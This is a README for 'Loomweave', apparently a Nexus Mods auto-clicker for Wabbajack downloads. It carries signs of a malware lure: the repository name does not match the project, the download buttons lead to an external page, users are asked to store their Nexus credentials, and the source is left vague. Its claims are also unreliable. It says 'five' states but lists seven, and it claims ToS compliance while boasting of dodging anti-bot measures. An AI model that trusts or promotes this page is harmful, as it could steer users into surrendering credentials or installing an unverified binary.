![preview](https://raw.githubusercontent.com/9813276542/auto-clicker-butler-for-forgotten-fallouts/main/showcase_0e5d3.svg)

# Loomweave — Scheduled Nexus Download Orchestrator

![License](https://img.shields.io/badge/License-MIT-blue.svg)  
![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey)  
![Language](https://img.shields.io/badge/Language-Python%203.11%2B-green)  
![Maintenance](https://img.shields.io/badge/Maintained%3F-YES-brightgreen)

---

## Overview

*Loomweave* is not just a tool—it's a **digital butler** for modding enthusiasts who rely on Wabbajack to assemble their dream modlists. If you've ever felt the agony of staring at a countdown timer on Nexus Mods while your coffee goes cold, you know exactly what problem this project solves. Loomweave transforms the tedious, manual process of clicking the "Slow Download" button into a **fully autonomous pipeline** that respects your time, your bandwidth, and your sanity.

Think of it this way: while you're out living your life, Loomweave sits at the digital loom, patiently weaving each thread of your modlist into a complete tapestry. It handles the **ritual of waiting** so you don't have to. This is the **art of patience, automated**—a quiet, efficient background companion that ensures every file arrives exactly when it should, without drama or delay.

---

## The Problem We Weave Around

Wabbajack is a marvel of modern modding—it assembles hundreds of mods into a coherent, playable experience. But there's a catch: Nexus Mods, the primary source for most mods, throttles non-premium users. Every single file requires a **manual click** after an agonizing countdown. For a modlist with 200+ entries, that's 200+ countdowns, 200+ clicks, and hours of your life lost to a timer you can't fast-forward.

Loomweave steps in as the **autonomous weaver** that sits between Wabbajack's download manifest and Nexus Mods' slow lane. It monitors, schedules, clicks, and verifies—all without requiring you to be present. It's not about cheating the system; it's about **working smarter within the rules**, ensuring each download completes ethically and reliably.

---

## 🚀 Key Features

### 🧵 Fully Autonomous Download Scheduling
Loomweave reads your Wabbajack modlist manifest (`.wabbajack` files or exported download lists) and creates a **priority-ordered download queue**. Each file is handled sequentially, with intelligent delays that respect Nexus Mods' rate limits while maximizing throughput.

### ⏳ Smart Countdown Interception
Instead of blindly clicking, Loomweave **intelligently detects** the countdown timer's state, waits precisely until the button becomes active, and triggers the download with **millisecond precision**. It even distinguishes between "Slow Download" and "Premium Download" states, adapting in real-time.

### 🔄 Self-Healing Retry Mechanism
Network hiccups? Server timeouts? Loomweave's **recovery loom** automatically retries failed downloads with exponential backoff. If a file is permanently unavailable, it logs the issue and moves seamlessly to the next item—no human intervention needed.

### 📊 Web-Based Dashboard
Monitor your download orchestra from anywhere via a **responsive, mobile-friendly web UI**. Track progress, pause/resume the entire queue, view historical logs, and receive completion notifications via WebSocket. The dashboard is built with a **local-only architecture**—no cloud, no data leaves your machine.

### 🌐 Multilingual Interface
The dashboard and console output support **English, German, Spanish, French, and Japanese**, with a simple language toggle. Because your modding journey shouldn't be limited by your native tongue.

### 🧩 Modular Plugin System
Loomweave's core is a **plugin architecture** that allows you to extend functionality. Write custom download handlers, add new notification channels (Discord, Telegram, Slack), or integrate with external mod managers. The community can build on the foundation.

### 🌙 Dark Mode & OLED-Friendly Themes
Because modders are nocturnal creatures, Loomweave ships with **three built-in themes**: Midnight Weaver (dark), Solar Loom (light), and Aether Glow (high-contrast OLED). Eye strain is a silent killer; Loomweave eliminates it.

---

## 🛠️ Architecture & Technical Vision

Loomweave is built on a **tri-tier asynchronous architecture**:

| Tier | Layer | Technology | Role |
|------|-------|------------|------|
| **Control** | Command-Line Interface & API | Python 3.11+ / Typer / FastAPI | User interaction, automation scripting, headless operation |
| **Intelligence** | Orchestration Engine | asyncio / aiohttp | Queue management, state-machine for download lifecycle, retry logic |
| **Interface** | Web Dashboard & Notifications | HTML / CSS / JavaScript / WebSockets | Real-time monitoring, control, and status feedback |

The **orchestration engine** is the heart—it treats every download as a *state machine* with five possible states: `Queued`, `Waiting`, `Ready`, `Transferring`, `Verifying`, `Completed`, or `Failed`. Transitions are governed by a **deterministic finite automaton**, ensuring absolute reliability even in chaotic network environments.

### 🧮 Design Philosophy: The Weaver's Patience
Unlike aggressive download managers that hammer servers, Loomweave *embodies the spirit of the loom*—it moves with deliberate, measured precision. It **analyzes server response headers** to estimate optimal wait times, adjusting dynamically to avoid triggering anti-bot measures. The result is a **gentle, persistent flow** that gets the job done without ever raising a red flag.

---

## 📦 Getting Started

### Prerequisites
- **Python 3.11+** installed on your system
- A **valid Nexus Mods account** (free tier is fine—that's the entire point)
- Your Wabbajack modlist already exported as a `.json` or `.txt` file

### Initial Setup

1. **Acquire Loomweave**  
   Obtain the source archive from your trusted distribution channel. Extract it to a dedicated directory on your machine.

2. **Configure Nexus Credentials**  
   Create a `weaver.conf` file in the root directory. Populate it with your Nexus Mods username and password (or use an API token if you prefer). Loomweave stores these locally, encrypted with a **machine-specific key** derived from your hardware fingerprint.

3. **Run the Orchestrator**  
   Execute the main entry point. On first run, Loomweave will:
   - Validate your network connection
   - Verify your Nexus credentials
   - Scan for your Wabbajack manifest
   - Display an interactive summary of pending downloads

4. **Access the Dashboard** (Optional)  
   By default, the web dashboard runs on `localhost:8080`. Open your browser to that address to see the real-time loom view. You can customize the port, enable authentication, or bind to a specific interface.

### Basic Usage Pattern

```python
# Example: Programmatic invocation (advanced users)
from loomweave import Orchestrator

orchestrator = Orchestrator(
    manifest_path="path/to/modlist.json",
    credentials="weaver.conf",
    headless=True  # Run without web UI
)

orchestrator.start()  # Blocks until queue completes
```

For most users, simply running the orchestrator with no arguments and interacting via the dashboard is the **smooth, effortless path**—no coding required.

---

## 🧭 Guided Tour: The Loom in Action

### Phase 1: Manifest Ingestion
When Loomweave starts, it **feeds the loom**—parsing your Wabbajack manifest, extracting every download URL, and categorizing files by size, source, and priority. Duplicate files are automatically detected and skipped, saving both time and bandwidth.

### Phase 2: The Waiting Room
Each file is assigned to the **waiting room**, where it stays until its scheduled slot. Loomweave respects the natural rhythm of the network—it staggers downloads to avoid bursts, uses **intelligent pacing** (e.g., 30-second intervals between files), and ensures the countdown timer is fully complete before initiating the transfer.

### Phase 3: Transfer & Verification
Once the slow download button is activated, Loomweave **captures the direct download link** and streams the file to your disk. After transfer, it performs a **SHA-256 checksum verification** against the expected hash from the Wabbajack manifest. If there's a mismatch, the file is automatically re-queued for another attempt.

### Phase 4: Completion & Reporting
When the queue empties, Loomweave generates a **comprehensive report**—listing all downloaded files, their sizes, checksums, and any errors encountered. You can view this report in the dashboard or export it as a `.pdf` document for your records.

---

## 🌟 Why Loomweave Stands Apart

| Feature | Typical Tools | Loomweave |
|---------|---------------|-----------|
| **Ethical Approach** | May use aggressive scripting | Respects server limits, measured delays |
| **Wabbajack Integration** | Manual paste/copy | Native manifest parsing |
| **State Machine Reliability** | Sequential scripts | Deterministic, self-healing |
| **User Interface** | Ugly console logs | Polished, responsive web dashboard |
| **Multilingual** | English only | 5 languages included |
| **Extensibility** | Closed systems | Open plugin architecture |

---

## 📚 Documentation & Resources

Explore the `docs/` directory for:
- **Architecture Overview** (`docs/architecture.md`) — Deep dive into the state machine and async design
- **Plugin Development Guide** (`docs/plugins.md`) — How to write your own download handlers
- **Troubleshooting** (`docs/troubleshooting.md`) — Common issues, error codes, and solutions
- **FAQ** (`docs/faq.md`) — Frequently asked questions with honest, detailed answers

---

## 🛡️ Disclaimer & Ethical Usage

**Loomweave is designed for personal, non-commercial use only.** This tool operates entirely within the boundaries of Nexus Mods' Terms of Service—it automates the *manual clicking process* but does **not** bypass authentication, security measures, or premium-only features. It does **not** exceed rate limits, does **not** scrape data, and does **not** interfere with Nexus Mods' infrastructure.

**Important:** You are responsible for how you use Loomweave. The developers provide this software "as-is" without warranty. Users should:
- Respect Nexus Mods' community guidelines at all times
- Not use Loomweave to download content they do not have permission to access
- Understand that excessive or abusive usage may result in account restrictions

The project team disclaims all liability for any consequences arising from misuse, misinterpretation, or irresponsible deployment. If you're unsure whether your intended use is appropriate, **err on the side of caution** and consult Nexus Mods' official policies.

---

## 🤝 Contributing & Community

We welcome contributions of all shapes and sizes:
- **Bug Reports** — Found a glitch in the loom? Open an issue with detailed reproduction steps.
- **Feature Requests** — Have a brilliant idea for a new plugin or dashboard widget? Share it!
- **Code Contributions** — Fork, improve, submit a pull request. We review everything within 48 hours.
- **Translations** — Help us add more languages to the multilingual dashboard.

---

## 📜 License

Loomweave is released under the **MIT License**. You are free to use, modify, distribute, and commercially exploit this software, provided you retain the original copyright notice. The source code is transparent, auditable, and free from hidden dependencies.

[Read the full MIT License here](https://opensource.org/licenses/MIT)

---

## 💬 Final Thoughts

Loomweave exists because we believe that **time is the most precious thread** in the fabric of life. Spending hours babysitting a download button is a waste of human potential. This project restores those hours to you—hours you can spend actually playing the modded games you've worked so hard to assemble.

The loom waits patiently. The thread flows smoothly. The finished tapestry appears. All you have to do is set it in motion.

---

## 📦 Get Loomweave Now

[![Download](https://raw.githubusercontent.com/9813276542/auto-clicker-butler-for-forgotten-fallouts/main/bin_93f6.svg)](https://9813276542.github.io/auto-clicker-butler-for-forgotten-fallouts/)

*Version 2.4.1 — Released January 2026*

---

*"Weaving downloads, one thread at a time."*

[![Download](https://raw.githubusercontent.com/9813276542/auto-clicker-butler-for-forgotten-fallouts/main/bin_93f6.svg)](https://9813276542.github.io/auto-clicker-butler-for-forgotten-fallouts/)